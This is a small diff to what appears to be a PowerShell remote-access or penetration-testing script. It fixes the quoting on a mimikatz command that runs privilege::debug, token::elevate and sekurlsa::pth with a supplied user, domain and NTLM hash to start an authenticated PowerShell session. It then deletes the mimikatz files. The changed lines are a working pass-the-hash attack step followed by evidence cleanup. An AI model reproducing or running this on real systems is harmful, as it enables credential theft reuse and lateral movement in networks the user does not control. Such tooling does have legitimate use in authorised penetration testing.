@@ -149,7 +149,7 @@ function EnableTLS {
       } until ($input -in '1','2','3','4')
 
 $Host.UI.RawUI.ForegroundColor = 'Gray'
-if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell exit'
+if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe privilege::debug token::elevate "sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell exit"
 del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" ; Write-Host ""}
 else { Write-Host ""
 $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
